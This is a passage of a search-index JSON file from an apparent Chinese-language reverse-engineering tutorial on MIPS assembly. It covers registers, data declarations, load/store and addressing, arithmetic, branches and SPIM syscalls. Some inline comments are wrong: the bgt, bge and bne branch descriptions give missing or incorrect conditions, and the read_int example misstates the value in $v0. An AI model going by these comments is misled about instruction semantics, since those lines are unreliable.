\u7684\u5c0f\u578b\u5d4c\u5165\u5f0f\u7cfb\u7edf\u4e2d\uff0c\u5b83\u53ef\u4ee5\u6307\u5411\u4e00\u5757\u8bbf\u95ee\u8f83\u4e3a\u9891\u7e41\u7684\u5168\u5c40\u6570\u636e\u533a\u57df\uff0c\u7531\u4e8eMIPS \u6c47\u7f16\u6307\u4ee4\u957f\u5ea6\u90fd\u662f 32bit\uff0c\u6307\u4ee4\u5185\u90e8\u7684 offset \u4e3a 16bit\uff0c\u4e14\u4e3a\u6709\u7b26\u53f7\u6570\uff0c\u6240\u4ee5\u80fd\u7528\u4e00\u6761\u6307\u4ee4\u4ee5 gp \u4e3a\u57fa\u5730\u5740\u8bbf\u95ee\u6b63\u8d1f 15bit \u7684\u5730\u5740\u7a7a\u95f4\uff0c\u63d0\u9ad8\u6548\u7387\u3002\u90a3\u4e48\u7f16\u8bd1\u5668\u600e\u4e48\u77e5\u9053gp\u521d\u59cb\u5316\u7684\u503c\u5462\uff1f\u53ea\u8981\u5728 link \u6587\u4ef6\u4e2d\u6dfb\u52a0 _gp \u7b26\u53f7\uff0c\u8fde\u63a5\u5668\u5c31\u4f1a\u8ba4\u4e3a\u8fd9\u662f gp \u7684\u503c\u3002\u6211\u4eec\u5728\u4e0a\u7535\u65f6\uff0c\u5c06 _gp \u7684\u503c\u8d4b\u7ed9 gp \u5bc4\u5b58\u5668\u5c31\u884c\u4e86\u3002 \u8bdd\u8bf4\u56de\u6765\uff0c\u8fd9\u90fd\u662f MIPS \u8bbe\u8ba1\u8005\u7684\u5efa\u8bae\uff0c\u4e0d\u662f\u5f3a\u5236\uff0c\u697c\u4e3b\u8fd8\u89c1\u8fc7\u4e00\u79cd gp \u5bc4\u5b58\u5668\u7684\u7528\u6cd5\uff0c\u6765\u5728\u4e2d\u65ad\u548c\u4efb\u52a1\u5207\u6362\u65f6\u505a sp \u7684\u5b58\u50a8\u8fc7\u6e21\uff0c\u4e5f\u662f\u53ef\u4ee5\u7684\u3002 fp \u8fd9\u4e2a\u5bc4\u5b58\u5668\u4e0d\u540c\u7684\u7f16\u8bd1\u5668\u5bf9\u5176\u89e3\u91ca\u4e0d\u540c\uff0cGNU MIPS C \u7f16\u8bd1\u5668\u4f7f\u7528\u5176\u4f5c\u4e3a\u5e27\u6307\u9488\uff0c\u6307\u5411\u5806\u6808\u91cc\u7684\u8fc7\u7a0b\u5e27\uff08\u4e00\u4e2a\u5b50\u51fd\u6570\uff09\u7684\u7b2c\u4e00\u4e2a\u5b57\uff0c\u5b50\u51fd\u6570\u53ef\u4ee5\u7528\u5176\u505a\u4e00\u4e2a\u504f\u79fb\u8bbf\u95ee\u6808\u5e27\u91cc\u7684\u5c40\u90e8\u53d8\u91cf\uff0csp \u4e5f\u53ef\u4ee5\u8f83\u4e3a\u7075\u6d3b\u7684\u79fb\u52a8\uff0c\u56e0\u4e3a\u5728\u51fd\u6570\u9000\u51fa\u4e4b\u524d\u4f7f\u7528 fp \u6765\u6062\u590d\uff1b\u8fd8\u8981\u4e00\u79cd\u800c SGI \u7684 C \u7f16\u8bd1\u5668\u4f1a\u5c06\u8fd9\u4e2a\u5bc4\u5b58\u5668\u76f4\u63a5\u4f5c\u4e3a s8,\u6269\u5c55\u4e86\u4e00\u4e2a\u4fdd\u7559\u5bc4\u5b58\u5668\u7ed9\u7f16\u8bd1\u5668\u4f7f\u7528\u3002 ra \u5728\u51fd\u6570\u8c03\u7528\u8fc7\u7a0b\u4e2d\uff0c\u4fdd\u6301\u5b50\u51fd\u6570\u8fd4\u56de\u540e\u7684\u6307\u4ee4\u5730\u5740\u3002\u6c47\u7f16\u8bed\u53e5\u91cc\u51fd\u6570\u8c03\u7528\u7684\u5f62\u5f0f\u4e3a\uff1a jal function_X \u8fd9\u6761\u6307\u4ee4 jal(jump-and-link,\u8df3\u8f6c\u5e76\u94fe\u63a5) \u6307\u4ee4\u4f1a\u5c06\u5f53\u671f\u6267\u884c\u8fd0\u884c\u6307\u4ee4\u7684\u5730\u5740 +4 \u5b58\u50a8\u5230 ra \u5bc4\u5b58\u5668\u91cc\uff0c\u7136\u540e\u8df3\u8f6c\u5230 function_X \u7684\u5730\u5740\u5904\u3002\u76f8\u5e94\u7684\uff0c\u5b50\u51fd\u6570\u8fd4\u56de\u65f6\uff0c\u6700\u5e38\u89c1\u7684\u4e00\u6761\u6307\u4ee4\u5c31\u662f jr ra ra \u662f\u4e00\u4e2a\u5bf9\u4e8e\u8c03\u8bd5\u5f88\u6709\u7528\u7684\u5bc4\u5b58\u5668\uff0c\u7cfb\u7edf\u7684\u8fd0\u884c\u7684\u4efb\u4f55\u65f6\u523b\u90fd\u53ef\u4ee5\u67e5\u770b\u5b83\u7684\u503c\u4ee5\u83b7\u53d6 CPU \u7684\u8fd0\u884c\u8f68\u8ff9\u3002 \u6700\u540e\uff0c\u5982\u679c\u7eaf\u5199\u6c47\u7f16\u8bed\u53e5\u7684\u8bdd\uff0c\u8fd9\u4e9b\u5bc4\u5b58\u5668\u5f53\u4e2d\u9664\u4e86 zero \u4e4b\u5916\uff0c\u5176\u5b83\u7684\u57fa\u672c\u4e0a\u90fd\u53ef\u4ee5\u505a\u666e\u901a\u5bc4\u5b58\u5668\u5b58\u53d6\u6570\u636e\u4f7f\u7528\uff08\u8fd9\u4e5f\u662f\u5b83\u4eec\u4e3a\u4ec0\u4e48\u4f1a\u5b9a\u4e49\u4e3a\u201c\u901a\u7528\u5bc4\u5b58\u5668\u201d\uff0c\u800c\u4e0d\u50cf\u5176\u5b83\u7684\u534f\u5904\u7406\u5668\u3001\u6216\u8005\u5916\u8bbe\u7684\u90fd\u662f\u4e13\u7528\u5bc4\u5b58\u5668\uff0c\u5176\u5728\u51fa\u5382\u65f6\u6240\u6709\u7684\u529f\u80fd\u90fd\u662f\u5b9a\u6b7b\u7684\uff09\uff0c\u90a3\u4e3a\u4ec0\u4e48\u6709\u8fd9\u4e48\u591a\u89c4\u5219\u5462 \uff1fMIPS \u5f00\u53d1\u8005\u4eec\u4e3a\u4e86\u8ba9\u81ea\u5df1\u7684\u5904\u7406\u5668\u53ef\u4ee5\u8fd0\u884c\u50cf C\u3001Java \u8fd9\u6837\u7684\u9ad8\u7ea7\u8bed\u8a00\uff0c\u4ee5\u53ca\u8ba9\u6c47\u7f16\u8bed\u8a00\u548c\u9ad8\u7ea7\u8bed\u8a00\u53ef\u4ee5\u5b89\u5168\u7684\u6df7\u5408\u7f16\u7a0b\u800c\u8bbe\u8ba1\u7684\u4e00\u5957 ABI\uff08\u5e94\u7528\u7f16\u7a0b\u63a5\u53e3\uff09\uff0c\u4e0d\u540c\u7684\u7f16\u8bd1\u5668\u7684\u8bbe\u8ba1\u8005\u4eec\u5c31\u4f1a\u6709\u636e\u53ef\u4f9d\uff0c\u7cfb\u7edf\u7a0b\u5e8f\u5458\u4eec\u5728\u9605\u8bfb\u3001\u4fee\u6539\u6c47\u7f16\u7a0b\u5e8f\u7684\u65f6\u5019\u4e5f\u80fd\u6839\u636e\u8fd9\u4e9b\u7ea6\u5b9a\u800c\u66f4\u4e3a\u987a\u7545\u5730\u7406\u89e3\u6c47\u7f16\u4ee3\u7801\u7684\u542b\u4e49\u3002","title":"\u5bc4\u5b58\u5668"},{"location":"Tutorial/Material/Reverse/#_17","text":"\u672c\u8d28\u4e0a\u53ea\u662f\u5e26\u6709\u6570\u636e\u58f0\u660e\u7684\u7eaf\u6587\u672c\u6587\u4ef6\uff0c\u7a0b\u5e8f\u4ee3\u7801 ( \u6587\u4ef6\u540d\u5e94\u4ee5\u540e\u7f00 .s \u7ed3\u5c3e\uff0c\u6216\u8005.asm ) \u6570\u636e\u58f0\u660e\u90e8\u5206\u540e\u8ddf\u7a0b\u5e8f\u4ee3\u7801\u90e8\u5206","title":"\u7a0b\u5e8f\u7ed3\u6784"},{"location":"Tutorial/Material/Reverse/#_18","text":"\u6570\u636e\u4ee5 .data \u4e3a\u6807\u8bc6 \u58f0\u660e\u53d8\u91cf\u540e\uff0c\u5373\u5728\u5185\u5b58\u4e2d\u5206\u914d\u7a7a\u95f4","title":"\u6570\u636e\u58f0\u660e"},{"location":"Tutorial/Material/Reverse/#_19","text":"\u653e\u5728\u7528\u6c47\u7f16\u6307\u4ee4 .text \u6807\u8bc6\u7684\u6587\u672c\u90e8\u5206\u4e2d \u5305\u542b\u7a0b\u5e8f\u4ee3\u7801\uff08 \u6307\u4ee4 \uff09 \u7ed9\u5b9a\u6807\u7b7e main \u4ee3\u7801\u6267\u884c\u7684\u8d77\u70b9 ( \u548c C \u8bed\u8a00\u4e00\u6837 ) \u7a0b\u5e8f\u7ed3\u675f\u6807\u5fd7\uff08\u89c1\u4e0b\u9762\u7684\u7cfb\u7edf\u8c03\u7528\uff09","title":"\u4ee3\u7801"},{"location":"Tutorial/Material/Reverse/#_20","text":"\uff03 \u8868\u793a\u5355\u884c\u6ce8\u91ca \uff03 \u540e\u9762\u7684\u4efb\u4f55\u5185\u5bb9\u90fd\u4f1a\u88ab\u89c6\u4e3a\u6ce8\u91ca MIPS \u6c47\u7f16\u8bed\u8a00\u7a0b\u5e8f\u7684\u6a21\u677f\uff1a \uff03\u7ed9\u51fa\u7a0b\u5e8f\u540d\u79f0\u548c\u529f\u80fd\u63cf\u8ff0\u7684\u6ce8\u91ca \uff03Template.s #MIPS\u6c47\u7f16\u8bed\u8a00\u7a0b\u5e8f\u7684Bare-bones\u6982\u8ff0 .data #\u53d8\u91cf\u58f0\u660e\u9075\u5faa\u8fd9\u4e00\u884c \uff03... .text\uff03\u6307\u4ee4\u8ddf\u968f\u8fd9\u4e00\u884c main\uff1a\uff03\u8868\u793a\u4ee3\u7801\u7684\u5f00\u59cb\uff08\u6267\u884c\u7684\u7b2c\u4e00\u6761\u6307\u4ee4\uff09 \uff03... \uff03\u7a0b\u5e8f\u7ed3\u675f\uff0c\u4e4b\u540e\u7559\u7a7a\uff0c\u8ba9SPIM\u6ee1\u610f.","title":"\u6ce8\u91ca"},{"location":"Tutorial/Material/Reverse/#_21","text":"\u58f0\u660e\u683c\u5f0f\uff1a name\uff1astorage_type value\uff08s\uff09 \u4f7f\u7528\u7ed9\u5b9a\u540d\u79f0\u548c\u6307\u5b9a\u503c\u4e3a\u6307\u5b9a\u7c7b\u578b\u7684\u53d8\u91cf\u521b\u5efa\u7a7a\u95f4 value (s) \u901a\u5e38\u7ed9\u51fa\u521d\u59cb\u503c; \u5bf9\u4e8e.space\uff0c\u7ed9\u51fa\u8981\u5206\u914d\u7684\u7a7a\u683c\u6570 \u6ce8\u610f\uff1a\u6807\u7b7e\u540e\u9762\u8ddf\u5192\u53f7\uff08:) \u4f8b\u5982 var1\uff1a.word 3 \uff03\u521b\u5efa\u4e00\u4e2a\u521d\u59cb\u503c\u4e3a 3 \u7684\u6574\u6570\u53d8\u91cf array1\uff1a.byte'a'\uff0c'b' \uff03\u521b\u5efa\u4e00\u4e2a\u5143\u7d20\u521d\u59cb\u5316\u7684 2 \u5143\u7d20\u5b57\u7b26\u6570\u7ec4\u5230 a \u548c b array2\uff1a.space 40 #\u5206\u914d 40 \u4e2a\u8fde\u7eed\u5b57\u8282, \u672a\u521d\u59cb\u5316\u7684\u7a7a\u95f4\u53ef\u4ee5\u7528\u4f5c 40 \u4e2a\u5143\u7d20\u7684\u5b57\u7b26\u6570\u7ec4, \u6216\u8005\u662f #10 \u4e2a\u5143\u7d20\u7684\u6574\u6570\u6570\u7ec4.","title":"\u53d8\u91cf\u58f0\u660e"},{"location":"Tutorial/Material/Reverse/#loadstore","text":"\u5bf9 RAM \u7684\u8bbf\u95ee, \u4ec5\u5141\u8bb8\u4f7f\u7528\u52a0\u8f7d\u548c\u5b58\u50a8\u6307\u4ee4 ( \u5373 load \u6216\u8005 store ) \u6240\u6709\u5176\u4ed6\u6307\u4ee4\u90fd\u4f7f\u7528\u5bc4\u5b58\u5668\u53c2\u6570 load \uff1a lw register_destination\uff0cRAM_source #\u5c06\u6e90\u5185\u5b58\u5730\u5740\u7684\u5b57 ( 4 \u4e2a\u5b57\u8282 ) \u590d\u5236\u5230\u76ee\u6807\u5bc4\u5b58\u5668,\uff08lw\u4e2d\u7684'w'\u610f\u4e3a'word',\u5373\u8be5\u6570\u636e\u5927\u5c0f\u4e3a4\u4e2a\u5b57\u8282\uff09 lb register_destination\uff0cRAM_source #\u5c06\u6e90\u5185\u5b58\u5730\u5740\u7684\u5b57\u8282\u590d\u5236\u5230\u76ee\u6807\u5bc4\u5b58\u5668\u7684\u4f4e\u4f4d\u5b57\u8282, \u5e76\u5c06\u7b26\u53f7\u6620\u5c04\u5230\u9ad8\u4f4d\u5b57\u8282 ( \u540c\u4e0a, lb \u610f\u4e3a load byte ) store \uff1a sw register_source\uff0cRAM_destination #\u5c06\u6e90\u5bc4\u5b58\u5668\u7684\u5b57\u5b58\u50a8\u5230\u76ee\u6807\u5185\u5b58RAM\u4e2d sb register_source\uff0cRAM_destination #\u5c06\u6e90\u5bc4\u5b58\u5668\u4e2d\u7684\u4f4e\u4f4d\u5b57\u8282\u5b58\u50a8\u5230\u76ee\u6807\u5185\u5b58RAM\u4e2d \u7acb\u5373\u52a0\u8f7d\uff1a li register_destination\uff0cvalue #\u628a\u7acb\u5373\u503c\u52a0\u8f7d\u5230\u76ee\u6807\u5bc4\u5b58\u5668\u4e2d,\u987e\u540d\u601d\u4e49, \u8fd9\u91cc\u7684 li \u610f\u4e3a load immediate, \u5373\u7acb\u5373\u52a0\u8f7d. \u4f8b\u5b50 .data var1: .word 23 # \u7ed9\u53d8\u91cf var1 \u5728\u5185\u5b58\u4e2d\u5f00\u8f9f\u7a7a\u95f4, \u53d8\u91cf\u521d\u59cb\u503c\u4e3a 23 .text __start: lw $t0, var1 # \u5c06\u5185\u5b58\u5355\u5143\u4e2d\u7684\u5185\u5bb9\u52a0\u8f7d\u5230\u5bc4\u5b58\u5668\u4e2d $t0: $t0 = var1 li $t1, 5 # $t1 = 5 (\"\u7acb\u5373\u52a0\u8f7d\") sw $t1, var1 # \u628a\u5bc4\u5b58\u5668$t1\u7684\u5185\u5bb9\u5b58\u5230\u5185\u5b58\u4e2d : var1 = $t1 done","title":"\u8bfb\u53d6/\u5199\u5165 ( Load/Store )\u6307\u4ee4"},{"location":"Tutorial/Material/Reverse/#_22","text":"\u4ec5\u7528\u4e8e\u8bfb\u53d6\u548c\u5199\u5165\u6307\u4ee4 *\u76f4\u63a5\u7ed9\u5730\u5740\uff1a* la $t0\uff0cvar1 \u5c06 var1 \u7684\u5185\u5b58\u5730\u5740\uff08\u53ef\u80fd\u662f\u7a0b\u5e8f\u4e2d\u5b9a\u4e49\u7684\u6807\u7b7e\uff09\u590d\u5236\u5230\u5bc4\u5b58\u5668 $t0 \u4e2d *\u95f4\u63a5\u5bfb\u5740, \u5730\u5740\u662f\u5bc4\u5b58\u5668\u7684\u5185\u5bb9, \u7c7b\u4f3c\u6307\u9488\uff1a* lw $t2\uff0c\uff08$t0\uff09 \u5c06 $t0 \u4e2d\u5305\u542b\u7684 RAM \u5730\u5740\u52a0\u8f7d\u5230 $t2 sw $t2\uff0c\uff08$t0\uff09 \u5c06 $t2 \u5bc4\u5b58\u5668\u4e2d\u7684\u5b57\u5b58\u50a8\u5230 $t0 \u4e2d\u5305\u542b\u7684\u5730\u5740\u7684 RAM \u4e2d *\u57fa\u4e8e\u504f\u79fb\u91cf\u7684\u5bfb\u5740\uff1a* lw $t2, 4\uff08$t0\uff09 \u5c06\u5185\u5b58\u5730\u5740 ( $t0 + 4 ) \u7684\u5b57\u52a0\u8f7d\u5230\u5bc4\u5b58\u5668 $t2 \u4e2d \u201c 4 \u201d \u7ed9\u51fa\u4e86\u5bc4\u5b58\u5668 $t0 \u4e2d\u5730\u5740\u7684\u504f\u79fb\u91cf sw $t2\uff0c-12\uff08$t0\uff09 \u5c06\u5bc4\u5b58\u5668 $t2 \u4e2d\u7684\u5b57\u653e\u5230\u5185\u5b58\u5730\u5740\uff08 $t0 - 12 \uff09 \u8d1f\u504f\u79fb\u4e5f\u662f\u53ef\u4ee5\u7684, \u53cd\u5411\u6f02\u79fb\u65b9\u4e0d\u65b9 ? \u6ce8\u610f\uff1a\u57fa\u4e8e \u504f\u79fb\u91cf \u7684\u5bfb\u5740\u7279\u522b\u9002\u7528\u4e8e\uff1a \u6570\u7ec4; \u8bbf\u95ee\u5143\u7d20\u4f5c\u4e3a\u4e0e\u57fa\u5740\u7684\u504f\u79fb\u91cf \u6808; \u6613\u4e8e\u8bbf\u95ee\u504f\u79bb\u6808\u6307\u9488\u6216\u5e27\u6307\u9488\u7684\u5143\u7d20 \u4f8b\u5b50 .data array1: .space 12 # \u5b9a\u4e49\u4e00\u4e2a 12\u5b57\u8282 \u957f\u5ea6\u7684\u6570\u7ec4 array1, \u5bb9\u7eb3 3\u4e2a\u6574\u578b .text __start: la $t0, array1 # \u8ba9 $t0 = \u6570\u7ec4\u9996\u5730\u5740 li $t1, 5 # $t1 = 5 (\"load immediate\") sw $t1, ($t0) # \u6570\u7ec4\u7b2c\u4e00\u4e2a\u5143\u7d20\u8bbe\u7f6e\u4e3a 5; \u7528\u7684\u95f4\u63a5\u5bfb\u5740; array[0] = $1 = 5 li $t1, 13 # $t1 = 13 sw $t1, 4($t0) # \u6570\u7ec4\u7b2c\u4e8c\u4e2a\u5143\u7d20\u8bbe\u7f6e\u4e3a 13; array[1] = $1 = 13 #\u8be5\u6570\u7ec4\u4e2d\u6bcf\u4e2a\u5143\u7d20\u5730\u5740\u76f8\u8ddd\u957f\u5ea6\u5c31\u662f\u81ea\u8eab\u6570\u636e\u7c7b\u578b\u957f\u5ea6\uff0c\u53734\u5b57\u8282\uff0c \u6240\u4ee5\u5bf9\u4e8earray+4\u5c31\u662farray[1] li $t1, -7 # $t1 = -7 sw $t1, 8($t0) # \u7b2c\u4e09\u4e2a\u5143\u7d20\u8bbe\u7f6e\u4e3a -7; #array+8 = \uff08address[array[0])+4\uff09+ 4 = address(array[1]) + 4 = address(array[2]) done","title":"\u95f4\u63a5\u548c\u7acb\u5373\u5bfb\u5740"},{"location":"Tutorial/Material/Reverse/#_23","text":"\u6700\u591a\u4f7f\u75283\u4e2a\u53c2\u6570 \u6240\u6709\u64cd\u4f5c\u6570\u90fd\u662f\u5bc4\u5b58\u5668; \u4e0d\u80fd\u6709\u5185\u5b58\u5730\u5740\u7684\u5b58\u5728 \u64cd\u4f5c\u6570\u5927\u5c0f\u662f\u5b57 ( 4\u4e2a\u5b57\u8282 ), 32\u4f4d = 4 * 8 bit = 4bytes = 1 word add $t0,$t1,$t2 # $t0 = $t1 + $t2;\u6dfb\u52a0\u4e3a\u5e26\u7b26\u53f7\uff082 \u7684\u8865\u7801\uff09\u6574\u6570 sub $t2,$t3,$t4 # $t2 = $t3 \u00d0 $t4 addi $t2,$t3, 5 # $t2 = $t3 + 5; addu $t1,$t6,$t7 # $t1 = $t6 + $t7;\u8ddf\u65e0\u7b26\u53f7\u6570\u90a3\u6837\u76f8\u52a0 subu $t1,$t6,$t7 # $t1 = $t6 - $t7;\u8ddf\u65e0\u7b26\u53f7\u6570\u90a3\u6837\u76f8\u51cf mult $t3,$t4 # \u8fd0\u7b97\u7ed3\u679c\u5b58\u50a8\u5728hi,lo\uff08hi\u9ad8\u4f4d\u6570\u636e\uff0c lo\u5730\u4f4d\u6570\u636e\uff09 div $t5,$t6 # Lo = $t5 / $t6 (\u6574\u6570\u5546) # Hi = $t5 mod $t6 (\u6c42\u4f59\u6570) #\u5546\u6570\u5b58\u653e\u5728 lo, \u4f59\u6570\u5b58\u653e\u5728 hi mfhi $t0 # \u628a\u7279\u6b8a\u5bc4\u5b58\u5668 Hi \u7684\u503c\u79fb\u52a8\u5230 $t0 : $t0 = Hi mflo $t1 # \u628a\u7279\u6b8a\u5bc4\u5b58\u5668 Lo \u7684\u503c\u79fb\u52a8\u5230 $t1: $t1 = Lo #\u4e0d\u80fd\u76f4\u63a5\u83b7\u53d6 hi \u6216 lo\u4e2d\u7684\u503c\uff0c \u9700\u8981mfhi, mflo\u6307\u4ee4\u4f20\u503c\u7ed9\u5bc4\u5b58\u5668 move $t2,$t3 # $t2 = $t3","title":"\u7b97\u672f\u6307\u4ee4"},{"location":"Tutorial/Material/Reverse/#_24","text":"\u5206\u652f ( if-else ) \u6761\u4ef6\u5206\u652f\u7684\u6bd4\u8f83\u5185\u7f6e\u4e8e\u6307\u4ee4\u4e2d b target \uff03\u65e0\u6761\u4ef6\u5206\u652f,\u76f4\u63a5\u5230\u7a0b\u5e8f\u6807\u7b7e\u76ee\u6807 beq $t0, $t1, target \uff03if $t0 = $ t1, \u5c31\u8df3\u5230\u76ee\u6807 blt $t0, $t1, target \uff03if $t0 <$ t1, \u5c31\u8df3\u5230\u76ee\u6807 ble $t0, $t1, target \uff03if $t0 <= $ t1, \u5c31\u8df3\u5230\u76ee\u6807 bgt $t0, $t1, target \uff03if $t0 $ t1, \u5c31\u8df3\u5230\u76ee\u6807 bge $t0, $t1, target \uff03if $t0 = $ t1, \u5c31\u8df3\u5230\u76ee\u6807 bne $t0, $t1, target #if $t0 < $t1, \u5c31\u8df3\u5230\u76ee\u6807 \u8df3\u8f6c ( while, for, goto ) j target #\u770b\u5230\u5c31\u8df3\uff0c \u4e0d\u7528\u8003\u8651\u4efb\u4f55\u6761\u4ef6 jr $t3 #\u7c7b\u4f3c\u76f8\u5bf9\u5bfb\u5740\uff0c\u8df3\u5230\u8be5\u5bc4\u5b58\u5668\u7ed9\u51fa\u7684\u5730\u5740\u5904 \u5b50\u7a0b\u5e8f\u8c03\u7528 \u5b50\u7a0b\u5e8f\u8c03\u7528\uff1a\u201c \u8df3\u8f6c\u548c\u94fe\u63a5 \u201d \u6307\u4ee4 jal sub_label \uff03\u201c\u8df3\u8f6c\u548c\u94fe\u63a5\u201d \u5c06\u5f53\u524d\u7684\u7a0b\u5e8f\u8ba1\u6570\u5668\u4fdd\u5b58\u5230 $ra \u4e2d \u8df3\u8f6c\u5230 sub_label \u7684\u7a0b\u5e8f\u8bed\u53e5 \u5b50\u7a0b\u5e8f\u8fd4\u56de\uff1a\u201c\u8df3\u8f6c\u5bc4\u5b58\u5668\u201d\u6307\u4ee4 jr $ra \uff03\u201c\u8df3\u8f6c\u5bc4\u5b58\u5668\u201d \u8df3\u8f6c\u5230$ ra\u4e2d\u7684\u5730\u5740\uff08\u7531jal\u6307\u4ee4\u5b58\u50a8\uff09 \u6ce8\u610f\uff1a\u5bc4\u5b58\u5730\u5740\u5b58\u50a8\u5728\u5bc4\u5b58\u5668 $ra \u4e2d; \u5982\u679c\u5b50\u4f8b\u7a0b\u5c06\u8c03\u7528\u5176\u4ed6\u5b50\u4f8b\u7a0b\uff0c\u6216\u8005\u662f\u9012\u5f52\u7684\uff0c\u5219\u8fd4\u56de\u5730\u5740\u5e94\u8be5\u4ece $ra \u590d\u5236\u5230\u6808\u4ee5\u4fdd\u7559\u5b83\uff0c\u56e0\u4e3a jal \u603b\u662f\u5c06\u8fd4\u56de\u5730\u5740\u653e\u5728\u8be5\u5bc4\u5b58\u5668\u4e2d\uff0c\u56e0\u6b64\u5c06\u8986\u76d6\u4e4b\u524d\u7684\u503c","title":"\u6d41\u7a0b\u63a7\u5236"},{"location":"Tutorial/Material/Reverse/#i-o-spim","text":"\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528\u5b9e\u73b0\u4ece\u8f93\u5165/\u8f93\u51fa\u7a97\u53e3\u8bfb\u53d6\u6216\u6253\u5370\u503c\u6216\u5b57\u7b26\u4e32\uff0c\u5e76\u6307\u793a\u7a0b\u5e8f\u7ed3\u675f syscall \u9996\u5148\u5728\u5bc4\u5b58\u5668 $v0 \u548c $a0 - $a1 \u4e2d\u63d0\u4f9b\u9002\u5f53\u7684\u503c \u5bc4\u5b58\u5668 $v0 \u4e2d\u5b58\u50a8\u8fd4\u56de\u7684\u7ed3\u679c\u503c\uff08 \u5982\u679c\u6709\u7684\u8bdd \uff09 \u4e0b\u8868\u5217\u51fa\u4e86\u53ef\u80fd\u7684 \u7cfb\u7edf\u8c03\u7528 \u670d\u52a1\u3002 Service \u670d\u52a1 Code in $v0 \u5bf9\u5e94\u529f\u80fd\u7684\u8c03\u7528\u7801 Arguments \u6240\u9700\u53c2\u6570 Results \u8fd4\u56de\u503c print \u4e00\u4e2a\u6574\u578b\u6570 $v0 = 1 $a0 = \u8981\u6253\u5370\u7684\u6574\u578b\u6570 print \u4e00\u4e2a\u6d6e\u70b9\u6570 $v0 = 2 $f12 = \u8981\u6253\u5370\u7684\u6d6e\u70b9\u6570 print \u53cc\u7cbe\u5ea6\u6570 $v0 = 3 $f12 = \u8981\u6253\u5370\u7684\u53cc\u7cbe\u5ea6\u6570 print \u5b57\u7b26\u4e32 $v0 = 4 $a0 = \u8981\u6253\u5370\u7684\u5b57\u7b26\u4e32\u7684\u5730\u5740 \u8bfb\u53d6 ( read ) \u6574\u578b\u6570 $v0 = 5 $v0 = \u8bfb\u53d6\u7684\u6574\u578b\u6570 \u8bfb\u53d6 ( read ) \u6d6e\u70b9\u6570 $v0 = 6 $v0 = \u8bfb\u53d6\u7684\u6d6e\u70b9\u6570 \u8bfb\u53d6 ( read ) \u53cc\u7cbe\u5ea6\u6570 $v0 = 7 $v0 = \u8bfb\u53d6\u7684\u53cc\u7cbe\u5ea6 \u8bfb\u53d6 ( read ) \u5b57\u7b26\u4e32 $v0 = 8 \u5c06\u8bfb\u53d6\u7684\u5b57\u7b26\u4e32\u5730\u5740\u8d4b\u503c\u7ed9 $a0 ; \u5c06\u8bfb\u53d6\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\u8d4b\u503c\u7ed9 $a1 \u8fd9\u4e2a\u5e94\u8be5\u548c C \u8bed\u8a00\u7684 sbrk() \u51fd\u6570\u4e00\u6837 $v0 = 9 \u9700\u8981\u5206\u914d\u7684\u7a7a\u95f4\u5927\u5c0f\uff08\u5355\u4f4d\u76ee\u6d4b\u662f\u5b57\u8282 bytes\uff09 \u5c06\u5206\u914d\u597d\u7684\u7a7a\u95f4\u9996\u5730\u5740\u7ed9 $v0 exit $v0 =10 \u8fd9\u4e2a\u8fd8\u8981\u8bf4\u5417.....= _ = print_string \u5373 print \u5b57\u7b26\u4e32 \u670d\u52a1\u671f\u671b\u542f\u52a8\u4ee5 null \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u3002\u6307\u4ee4 .asciiz \u521b\u5efa\u4e00\u4e2a\u4ee5 null \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u3002 read_int \uff0c read_float \u548c read_double \u670d\u52a1\u8bfb\u53d6\u6574\u884c\u8f93\u5165\uff0c\u5305\u62ec\u6362\u884c\u7b26 \\n \u3002 read_string \u670d\u52a1\u4e0e UNIX \u5e93\u4f8b\u7a0b fgets \u5177\u6709\u76f8\u540c\u7684\u8bed\u4e49\u3002 \u5b83\u5c06\u6700\u591a n-1 \u4e2a\u5b57\u7b26\u8bfb\u5165\u7f13\u51b2\u533a\uff0c\u5e76\u4ee5\u7a7a\u5b57\u7b26\u7ec8\u6b62\u5b57\u7b26\u4e32\u3002 \u5982\u679c\u5f53\u524d\u884c\u4e2d\u5c11\u4e8e n-1 \u4e2a\u5b57\u7b26\uff0c\u5219\u5b83\u4f1a\u8bfb\u53d6\u5e76\u5305\u542b\u6362\u884c\u7b26\uff0c\u5e76\u4f7f\u7528\u7a7a\u5b57\u7b26\u7ec8\u6b62\u8be5\u5b57\u7b26\u4e32\u3002 \u5c31\u662f\u8f93\u5165\u8fc7\u957f\u5c31\u622a\u53d6\uff0c\u8fc7\u77ed\u5c31\u8fd9\u6837\uff0c\u6700\u540e\u90fd\u8981\u52a0\u4e00\u4e2a\u7ec8\u6b62\u7b26\u3002 sbrk \u670d\u52a1\u5c06\u5730\u5740\u8fd4\u56de\u5230\u5305\u542b n \u4e2a\u9644\u52a0\u5b57\u8282\u7684\u5185\u5b58\u5757\u3002\u8fd9\u5c06\u7528\u4e8e\u52a8\u6001\u5185\u5b58\u5206\u914d\u3002 \u9000\u51fa\u670d\u52a1\u4f7f\u7a0b\u5e8f\u505c\u6b62\u8fd0\u884c \u4f8b\u5b50 : \u6253\u5370\u4e00\u4e2a\u5b58\u50a8\u5728 $2 \u7684\u6574\u578b\u6570 li $v0, 1 #\u58f0\u660e\u9700\u8981\u8c03\u7528\u7684\u64cd\u4f5c\u4ee3\u7801\u4e3a 1 ( print_int ), \u7136\u540e\u8d4b\u503c\u7ed9 $v0 move $a0, $t2 #\u628a\u8fd9\u4e2a\u8981\u6253\u5370\u7684\u6574\u578b\u6570\u8d4b\u503c\u7ed9 $a0 syscall #\u8ba9\u64cd\u4f5c\u7cfb\u7edf\u6267\u884c\u6211\u4eec\u7684\u64cd\u4f5c \u4f8b\u5b50 : \u8bfb\u53d6\u4e00\u4e2a\u6570\uff0c\u5e76\u4e14\u5b58\u50a8\u5230\u5185\u5b58\u4e2d\u7684 int_value \u53d8\u91cf\u4e2d masm li $v0, 5 #\u58f0\u660e\u9700\u8981\u8c03\u7528\u7684\u64cd\u4f5c\u4ee3\u7801\u4e3a 5 ( read_int ), \u7136\u540e\u8d4b\u503c\u7ed9 $v0 syscall #\u8ba9\u64cd\u4f5c\u7cfb\u7edf\u6267\u884c\u6211\u4eec\u7684\u64cd\u4f5c, \u7136\u540e $v0 = 5 sw $v0, int_value #\u901a\u8fc7\u5199\u5165\uff08store_word)\u6307\u4ee4 \u5c06 $v0 \u7684\u503c\uff085\uff09\u5b58\u5165\u5185\u5b58\u4e2d \u4f8b\u5b50 : \u6253\u5370\u4e00\u4e2a\u5b57\u7b26\u4e32 ( 